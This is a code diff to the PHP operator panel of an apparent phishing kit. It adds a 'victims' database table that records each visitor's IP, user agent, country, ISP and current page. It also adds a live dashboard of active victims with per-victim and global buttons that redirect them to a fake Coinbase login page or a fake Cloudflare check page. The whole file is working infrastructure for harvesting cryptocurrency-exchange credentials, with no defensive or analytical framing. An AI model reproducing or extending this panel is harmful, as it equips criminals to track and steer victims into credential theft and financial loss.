@@ -13,7 +13,6 @@ if (!is_logged_in()) {
 }
 
 // Then include protection scripts
-
 require_once __DIR__ . '/blocker-raw.php';
 
 // Handle logout
@@ -24,47 +23,70 @@ if (isset($_GET['action']) && $_GET['action'] === 'logout') {
 }
 
 // Handle redirect commands
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['redirect_command'])) {
-    $command = $_POST['redirect_command'];
-    $target = $_POST['redirect_target'] ?? '';
-    
-    // Use database instead of file
-    $database = new Database();
-    $db = $database->getConnection();
-    
-    switch($command) {
-        case 'redirect_to_coinbase':
-            $query = "INSERT INTO redirect_commands (command, target, created_at) 
-                     VALUES ('redirect', 'coinbaselogin.html', NOW())";
-            $_SESSION['success_message'] = 'Victim will be redirected to Coinbase Login';
-            break;
-            
-        case 'redirect_to_cloudflare':
-            $query = "INSERT INTO redirect_commands (command, target, created_at) 
-                     VALUES ('redirect', 'index.php', NOW())";
-            $_SESSION['success_message'] = 'Victim will be redirected to Cloudflare Protection';
-            break;
-            
-        case 'redirect_custom':
-            if (!empty($target)) {
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Handle redirect commands
+    if (isset($_POST['redirect_command'])) {
+        $command = $_POST['redirect_command'];
+        $target = $_POST['redirect_target'] ?? '';
+        
+        // Use database instead of file
+        $database = new Database();
+        $db = $database->getConnection();
+        
+        switch($command) {
+            case 'redirect_to_coinbase':
                 $query = "INSERT INTO redirect_commands (command, target, created_at) 
-                         VALUES ('redirect', :target, NOW())";
-                $stmt = $db->prepare($query);
-                $stmt->execute([':target' => $target]);
-                $_SESSION['success_message'] = 'Victim will be redirected to: ' . $target;
-            } else {
-                $_SESSION['error_message'] = 'Please enter a target URL';
-            }
-            break;
-            
-        case 'clear_redirect':
-            $query = "DELETE FROM redirect_commands WHERE command = 'redirect'";
-            $_SESSION['success_message'] = 'Redirect command cleared';
-            break;
+                         VALUES ('redirect', 'coinbaselogin.html', NOW())";
+                $_SESSION['success_message'] = 'Victim will be redirected to Coinbase Login';
+                break;
+                
+            case 'redirect_to_cloudflare':
+                $query = "INSERT INTO redirect_commands (command, target, created_at) 
+                         VALUES ('redirect', 'index.php', NOW())";
+                $_SESSION['success_message'] = 'Victim will be redirected to Cloudflare Protection';
+                break;
+                
+            case 'redirect_custom':
+                if (!empty($target)) {
+                    $query = "INSERT INTO redirect_commands (command, target, created_at) 
+                             VALUES ('redirect', :target, NOW())";
+                    $stmt = $db->prepare($query);
+                    $stmt->execute([':target' => $target]);
+                    $_SESSION['success_message'] = 'Victim will be redirected to: ' . $target;
+                } else {
+                    $_SESSION['error_message'] = 'Please enter a target URL';
+                }
+                break;
+                
+            case 'clear_redirect':
+                $query = "DELETE FROM redirect_commands WHERE command = 'redirect'";
+                $_SESSION['success_message'] = 'Redirect command cleared';
+                break;
+        }
+        
+        if (isset($query) && $command !== 'redirect_custom') {
+            $db->exec($query);
+        }
     }
     
-    if (isset($query) && $command !== 'redirect_custom') {
-        $db->exec($query);
+    // Handle victim redirect
+    if (isset($_POST['redirect_victim'])) {
+        $victim_id = $_POST['victim_id'];
+        $redirect_target = $_POST['victim_redirect_target'];
+        
+        $database = new Database();
+        $db = $database->getConnection();
+        
+        // Update the redirect command for this specific victim
+        $query = "INSERT INTO redirect_commands (command, target, victim_id, created_at) 
+                 VALUES ('redirect', :target, :victim_id, NOW())";
+        $stmt = $db->prepare($query);
+        $stmt->execute([
+            ':target' => $redirect_target,
+            ':victim_id' => $victim_id
+        ]);
+        
+        $_SESSION['success_message'] = 'Redirect command sent to victim';
     }
     
     header('Location: /panel.php');
@@ -80,14 +102,43 @@ $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
     id SERIAL PRIMARY KEY,
     command VARCHAR(50) NOT NULL,
     target TEXT NOT NULL,
+    victim_id INTEGER DEFAULT NULL,
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 )";
 $db->exec($create_table);
 
-$query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
+// Create victims table if not exists
+$create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
+    id SERIAL PRIMARY KEY,
+    ip_address VARCHAR(45) NOT NULL,
+    user_agent TEXT,
+    country VARCHAR(100),
+    isp VARCHAR(200),
+    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    status VARCHAR(20) DEFAULT 'active',
+    page_visited VARCHAR(255) DEFAULT 'index.php',
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)";
+$db->exec($create_victims_table);
+
+// Get current redirect
+$query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
 $stmt = $db->query($query);
 $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
 $current_redirect = $current_redirect ? $current_redirect['target'] : 'None';
+
+// Get active victims (last 30 minutes)
+$active_victims_query = "SELECT * FROM victims 
+                        WHERE last_activity > NOW() - INTERVAL '30 minutes' 
+                        AND status = 'active'
+                        ORDER BY last_activity DESC";
+$active_victims_stmt = $db->query($active_victims_query);
+$active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
+
+// Get total victims count
+$total_victims_query = "SELECT COUNT(*) as total FROM victims";
+$total_victims_stmt = $db->query($total_victims_query);
+$total_victims = $total_victims_stmt->fetch(PDO::FETCH_ASSOC)['total'];
 
 // Handle messages from session
 if (isset($_SESSION['success_message'])) {
@@ -226,6 +277,34 @@ if (isset($_SESSION['error_message'])) {
             background: rgba(255,255,255,0.1);
             transform: translateY(-2px);
         }
+        
+        .victim-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .victim-table th, .victim-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .victim-table th {
+            background: rgba(0,0,0,0.3);
+            color: var(--primary-color-light);
+        }
+        .victim-table tr:hover {
+            background: rgba(255,255,255,0.05);
+        }
+        
+        .badge {
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.8em;
+            margin-left: 5px;
+        }
+        .badge.success { background: var(--success-color); }
+        .badge.warning { background: var(--warning-color); }
+        .badge.info { background: var(--primary-color); }
     </style>
 </head>
 <body>
@@ -252,30 +331,109 @@ if (isset($_SESSION['error_message'])) {
             }
             ?>
 
-            <!-- Current Status -->
+            <!-- Stats Overview -->
             <div class="card">
-                <h5>🔄 Current Redirect Status</h5>
-                <div class="victim-status">
-                    <?php
-                    $status_class = $current_redirect === 'None' ? 'status-inactive' : 'status-active';
-                    ?>
-                    <p>
-                        <span class="status-indicator <?php echo $status_class; ?>"></span>
-                        <strong>Active Redirect:</strong> 
-                        <span style="color: #64b5f6;"><?php echo htmlspecialchars($current_redirect); ?></span>
-                    </p>
+                <h5>📊 Overview</h5>
+                <div class="row">
+                    <div class="col s12 m4">
+                        <div class="victim-status">
+                            <h6>Active Victims</h6>
+                            <h4><?php echo count($active_victims); ?> <span class="badge success">Live</span></h4>
+                        </div>
+                    </div>
+                    <div class="col s12 m4">
+                        <div class="victim-status">
+                            <h6>Total Victims</h6>
+                            <h4><?php echo $total_victims; ?> <span class="badge info">All Time</span></h4>
+                        </div>
+                    </div>
+                    <div class="col s12 m4">
+                        <div class="victim-status">
+                            <h6>Current Redirect</h6>
+                            <h4 style="color: #64b5f6;"><?php echo htmlspecialchars($current_redirect); ?></h4>
+                        </div>
+                    </div>
                 </div>
+            </div>
+
+            <!-- Active Victims Section -->
+            <div class="card">
+                <h5>👥 Active Victims (Last 30 minutes)</h5>
+                <?php if (count($active_victims) > 0): ?>
+                    <table class="victim-table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>IP Address</th>
+                                <th>Country/ISP</th>
+                                <th>Last Activity</th>
+                                <th>Current Page</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <?php foreach ($active_victims as $victim): ?>
+                                <tr>
+                                    <td>#<?php echo $victim['id']; ?></td>
+                                    <td>
+                                        <i class="material-icons tiny">computer</i>
+                                        <?php echo htmlspecialchars($victim['ip_address']); ?>
+                                    </td>
+                                    <td>
+                                        <?php 
+                                        echo htmlspecialchars($victim['country'] ?? 'Unknown');
+                                        if (!empty($victim['isp'])) {
+                                            echo '<br><small>' . htmlspecialchars($victim['isp']) . '</small>';
+                                        }
+                                        ?>
+                                    </td>
+                                    <td>
+                                        <?php 
+                                        $last_activity = strtotime($victim['last_activity']);
+                                        $time_diff = time() - $last_activity;
+                                        echo date('H:i:s', $last_activity);
+                                        echo '<br><small>' . floor($time_diff / 60) . ' min ago</small>';
+                                        ?>
+                                    </td>
+                                    <td>
+                                        <span class="badge info"><?php echo htmlspecialchars($victim['page_visited']); ?></span>
+                                    </td>
+                                    <td>
+                                        <form method="POST" style="display: inline;">
+                                            <input type="hidden" name="victim_id" value="<?php echo $victim['id']; ?>">
+                                            <input type="hidden" name="victim_redirect_target" value="coinbaselogin.html">
+                                            <button type="submit" name="redirect_victim" class="btn success btn-small">
+                                                <i class="material-icons tiny">login</i> Coinbase
+                                            </button>
+                                        </form>
+                                        <form method="POST" style="display: inline;">
+                                            <input type="hidden" name="victim_id" value="<?php echo $victim['id']; ?>">
+                                            <input type="hidden" name="victim_redirect_target" value="index.php">
+                                            <button type="submit" name="redirect_victim" class="btn primary btn-small">
+                                                <i class="material-icons tiny">security</i> Cloudflare
+                                            </button>
+                                        </form>
+                                    </td>
+                                </tr>
+                            <?php endforeach; ?>
+                        </tbody>
+                    </table>
+                <?php else: ?>
+                    <div class="victim-status">
+                        <p>No active victims in the last 30 minutes.</p>
+                    </div>
+                <?php endif; ?>
             </div>
 
             <!-- Quick Redirect Actions -->
             <div class="card">
-                <h5>🎯 Quick Redirect Actions</h5>
+                <h5>🎯 Global Redirect Actions</h5>
                 <div class="quick-action-grid">
                     <!-- Redirect to Coinbase Login -->
                     <div class="action-card">
                         <i class="material-icons large">login</i>
                         <h6>Send to Coinbase</h6>
-                        <p>Redirect victim to Coinbase login page</p>
+                        <p>Redirect ALL victims to Coinbase login</p>
                         <form method="POST" style="margin: 0;">
                             <input type="hidden" name="redirect_command" value="redirect_to_coinbase">
                             <button type="submit" class="btn success waves-effect waves-light">
@@ -289,7 +447,7 @@ if (isset($_SESSION['error_message'])) {
                     <div class="action-card">
                         <i class="material-icons large">security</i>
                         <h6>Send to Cloudflare</h6>
-                        <p>Redirect victim back to protection page</p>
+                        <p>Redirect ALL victims back to protection</p>
                         <form method="POST" style="margin: 0;">
                             <input type="hidden" name="redirect_command" value="redirect_to_cloudflare">
                             <button type="submit" class="btn primary waves-effect waves-light">
@@ -317,7 +475,7 @@ if (isset($_SESSION['error_message'])) {
 
             <!-- Custom Redirect -->
             <div class="card">
-                <h5>🔧 Custom Redirect</h5>
+                <h5>🔧 Custom Global Redirect</h5>
                 <form method="POST">
                     <div class="row">
                         <div class="input-field col s12 m8">
@@ -329,7 +487,7 @@ if (isset($_SESSION['error_message'])) {
                             <input type="hidden" name="redirect_command" value="redirect_custom">
                             <button type="submit" class="btn primary waves-effect waves-light" style="width: 100%;">
                                 <i class="material-icons left">settings</i>
-                                Set Custom Redirect
+                                Set Global Redirect
                             </button>
                         </div>
                     </div>
@@ -343,31 +501,6 @@ if (isset($_SESSION['error_message'])) {
                         </div>
                     </div>
                 </form>
-            </div>
-
-            <!-- Manual Page Access -->
-            <div class="card">
-                <h5>🌐 Manual Page Access</h5>
-                <div class="row">
-                    <div class="col s12 m4">
-                        <a href="index.php" target="_blank" class="btn primary waves-effect waves-light" style="width: 100%;">
-                            <i class="material-icons left">security</i>
-                            Open Cloudflare Page
-                        </a>
-                    </div>
-                    <div class="col s12 m4">
-                        <a href="coinbaselogin.html" target="_blank" class="btn success waves-effect waves-light" style="width: 100%;">
-                            <i class="material-icons left">login</i>
-                            Open Coinbase Login
-                        </a>
-                    </div>
-                    <div class="col s12 m4">
-                        <a href="panel.php" class="btn warning waves-effect waves-light" style="width: 100%;">
-                            <i class="material-icons left">refresh</i>
-                            Refresh Panel
-                        </a>
-                    </div>
-                </div>
             </div>
 
             <!-- System Information -->
